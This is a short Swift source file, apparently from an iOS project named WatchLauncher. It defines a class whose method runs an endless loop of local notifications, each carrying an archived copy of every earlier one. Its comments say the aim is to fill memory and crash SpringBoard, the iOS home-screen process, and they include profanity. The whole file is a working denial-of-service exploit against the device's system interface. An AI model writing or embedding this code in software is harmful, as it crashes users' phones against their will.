//
//  Crasher.swift
//  WatchLauncher
//
//  Created by AppleBetas on 2016-07-09.
//  Copyright © 2016 AppleBetas. All rights reserved.
//

import UIKit

class Crasher {
    // Build up an array of all of the notifications we sent that is included in the next notification so we fill the memory with our shit notifications
    private var pastNotifications = [UILocalNotification]()
    
    // I know I should be using UserNotifications, but they patched the way in which we crash SpringBoard
    func crashSpringboard() {
        while true {
            let notification = UILocalNotification()
                notification.alertBody = "I'm here to crash your phone"
            // Encode to be put in dictionary
            let archived = NSKeyedArchiver.archivedData(withRootObject: pastNotifications)
            notification.userInfo = ["pastNotificationsBecauseFuckYou": archived]
            // Add this one
            pastNotifications.append(notification)
            // Send
            UIApplication.shared().presentLocalNotificationNow(notification)
        }
    }
    
}
